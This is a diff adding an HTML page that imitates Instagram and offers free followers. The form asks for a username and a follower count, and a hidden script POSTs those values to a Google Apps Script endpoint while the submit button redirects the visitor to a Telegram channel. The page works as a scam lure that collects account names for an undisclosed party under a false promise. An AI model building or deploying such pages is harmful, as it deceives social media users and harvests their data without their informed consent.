@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+
+    <link rel="stylesheet" href="style.css";>
+
+</head>
+<body>
+    
+
+<form   id="instagram" method="post">
+
+    <div id="wrapper">
+        <div class="main-content">
+          <div class="header">
+            <img src="insta.png"/>
+          </div>
+          <div class="l-part">
+            <input type="text" placeholder="Username" class="input-1" name="username" required/>
+            <div class="overlap-text">
+              <input type="number" placeholder="Followers you want" class="input-2" name="followers" required/>
+              
+            </div>
+            <input type="submit" value="submit" class="btn" name="submit" />
+
+
+
+          </form>
+
+
+            <script>
+              let btn = document.querySelector(".btn");
+              btn.addEventListener("click", function(){
+                window.location.href = "https://t.me/Youtuber_channels"
+              });
+            </script>
+
+
+
+
+
+
+          </div>
+        </div>
+        <div class="sub-content">
+          <div class="s-part">
+        
+            <a href=""><img src="logo(1).svg" style="height: 80px; align-items:center; margin-left:5%;"/></a>
+          </div>
+        </div>
+      </div>
+      
+      
+      
+      
+
+      <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbyoKsYp_KoylO2yFDAdOj1uZqC_WRQsDlHAYqWv-4hJBJYzvnPdTHvHO8kq7v5Uj9MglQ/exec'
+        const form = document.forms['instagram']
+      
+        form.addEventListener('submit', e => {
+          e.preventDefault()
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => console.log('Success!', response))
+            .catch(error => console.error('Error!', error.message))
+        })
+      </script>
+
+
+
+
+
+
+</body>
+</html>
